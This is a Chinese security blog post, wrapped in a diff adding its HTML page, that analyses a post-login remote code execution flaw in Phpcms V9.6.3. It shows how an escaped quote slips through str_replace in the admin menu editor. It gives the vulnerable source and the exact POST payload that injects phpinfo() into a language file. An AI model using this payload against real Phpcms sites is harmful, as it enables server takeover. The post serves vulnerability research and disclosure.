@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms V9.6.3 后台远程命令执行漏洞一、漏洞简介二、漏洞影响Phpcms V9.6.3 三、复现过程漏洞分析漏洞代码位于 &#x2F;phpcms&#x2F;modules&#x2F;admin&#x2F;menu.php 第 81 行 function edit() &amp;#123;     if(isset($_POST[&#39;dosubmit&#39;])) &amp;#123;         $id &#x3D; intval($_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms V9.6.3 后台远程命令执行漏洞一、漏洞简介二、漏洞影响Phpcms V9.6.3 三、复现过程漏洞分析漏洞代码位于 &#x2F;phpcms&#x2F;modules&#x2F;admin&#x2F;menu.php 第 81 行 function edit() &amp;#123;     if(isset($_POST[&#39;dosubmit&#39;])) &amp;#123;         $id &#x3D; intval($_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.744Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms V9.6.3 后台远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.744Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-3-后台远程命令执行漏洞"><a href="#Phpcms-V9-6-3-后台远程命令执行漏洞" class="headerlink" title="Phpcms V9.6.3 后台远程命令执行漏洞"></a>Phpcms V9.6.3 后台远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞代码位于 <code>/phpcms/modules/admin/menu.php</code> 第 81 行</p>
+<pre><code>function edit() &#123;
+    if(isset($_POST[&#39;dosubmit&#39;])) &#123;
+        $id = intval($_POST[&#39;id&#39;]);
+        //print_r($_POST[&#39;info&#39;]);exit;
+        $r = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));
+        $this-&gt;db-&gt;update($_POST[&#39;info&#39;],array(&#39;id&#39;=&gt;$id));
+        //修改语言文件
+        $file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;;
+        require $file;
+        $key = $_POST[&#39;info&#39;][&#39;name&#39;];
+        if(!isset($LANG[$key])) &#123;
+            $content = file_get_contents($file);
+            $content = substr($content,0,-2);
+            $data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;
+            file_put_contents($file,$data);
+        &#125; elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) &#123;
+            $content = file_get_contents($file);
+            $content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content);
+            file_put_contents($file,$content);
+        &#125;
+        $this-&gt;update_menu_models($id, $r, $_POST[&#39;info&#39;]);          
+        //结束语言文件修改
+        showmessage(L(&#39;operation_success&#39;));
+    &#125; else &#123;
+
+    .  .  .   .  .  .  
+
+    &#125;
+&#125;
+</code></pre>
+<p>这段代码是修改语言文件用的，而这个语言文件就是<br>/phpcms/languages/zh-cn/system_menu.lang.php</p>
+<p>里面一堆类似 <code>$LANG[&#39;video&#39;] = &#39;视频&#39;;</code> 的东西</p>
+<p>当时用 rips 扫描发现的大多是<br><code>$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;</code><br>这种拼接操作，而且 POST 中的单引号会被转义，无法逃逸</p>
+<p>转义代码位于 <code>/phpcms/libs/classes/param.class.php</code></p>
+<pre><code>public function __construct() &#123;
+    if(!get_magic_quotes_gpc()) &#123;
+        $_POST = new_addslashes($_POST);
+        $_GET = new_addslashes($_GET);
+        $_REQUEST = new_addslashes($_REQUEST);
+        $_COOKIE = new_addslashes($_COOKIE);
+    &#125;
+
+&#125;
+</code></pre>
+<p>而这里突然看到一个 str_replace ，<br><code>str_replace($LANG[$key],$_POST[&#39;language&#39;],$content)</code>，感觉可能会有漏洞</p>
+<p>一番胡乱测试之后惊奇的发现网站 500 了，细看原来是单引号逃逸导致报错</p>
+<p>下面是漏洞分析过程</p>
+<p>首先要登录后台拿到 pc_hash 的值，这个是防止提交恶意数据的，后台首页 F12<br>就能看到</p>
+<p><img src="/resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+<p>然后访问：</p>
+<pre><code>http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w
+</code></pre>
+<p>phpcms 的路由和那个 yzmcms 差不多，m 是模块名，对应 /phpcms<br>下的文件夹，c 是控制器名，对应 /phpcms/模块/ 下的 php 文件名，a<br>则对应控制器类的类函数名</p>
+<p>发送 POST 请求：</p>
+<pre><code>dosubmit=1&amp;info[name]=1&amp;language=1
+</code></pre>
+<p>语言文件最后会新添内容</p>
+<pre><code>$LANG[&#39;1&#39;] = &#39;1&#39;;
+</code></pre>
+<h3 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h3><p>发送 POST 请求：</p>
+<pre><code>dosubmit=1&amp;info[name]=1&amp;language=1&#39;
+</code></pre>
+<p><code>require $file;</code> 引入语言文件，<code>$LANG[$key]</code> 的值还是<br>NULL，所以执行拼接操作</p>
+<pre><code>$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;
+file_put_contents($file,$data);
+</code></pre>
+<p>得到语言文件新添内容为</p>
+<pre><code>$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;
+?&gt;
+</code></pre>
+<h3 id="第二次请求"><a href="#第二次请求" class="headerlink" title="第二次请求"></a>第二次请求</h3><p>发送与第一次相同的 POST 请求</p>
+<p><code>require $file;</code> 引入语言文件得到 <code>$LANG[$key]</code> 的值是<br><code>string(2) &quot;1&#39;&quot;</code>，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新<br><code>$LANG[$key]</code> 的值的</p>
+<p>但是因为 <code>require</code> 和 <code>file_get_contents</code><br>函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language<br>会被转义处理得到的值是 <code>string(3) &quot;1\&#39;&quot;</code></p>
+<p>于是判断 <code>$LANG[$key]!=$_POST[&#39;language&#39;]</code> 就成立了，接着 <code>str_replace</code><br>函数进行字符串替换操作，把原来的 <code>$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;</code> 中的 <code>1&#39;</code> 替换成<br><code>1\&#39;</code>，最终写入文件</p>
+<p>结果就得到了以下文件内容，第二个单引号被反斜杠转义，无法闭合</p>
+<pre><code>$LANG[&#39;1\&#39;] = &#39;1\&#39;&#39;;
+?&gt;
+</code></pre>
+<p>payload:</p>
+<p>发送两次以下请求，访问语言文件<br><a target="_blank" rel="noopener" href="http://www.0-sec.org:9000/phpcms/languages/zh-cn/system/_menu.lang.php">http://www.0-sec.org:9000/phpcms/languages/zh-cn/system\_menu.lang.php</a><br>即可得到 phpinfo</p>
+<p>URL:</p>
+<pre><code>http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w
+</code></pre>
+<p>POST:</p>
+<pre><code>dosubmit=1&amp;info[name]=];phpinfo();//1&amp;language=];phpinfo();//1&#39;
+</code></pre>
+<p><img src="/resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="2.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://j0k3r.top/2019/10/09/phpcmsv9.6.3/_background/_rce/">http://j0k3r.top/2019/10/09/phpcmsv9.6.3\_background\_rce/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu5w00e8y8v16do3ef2a" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
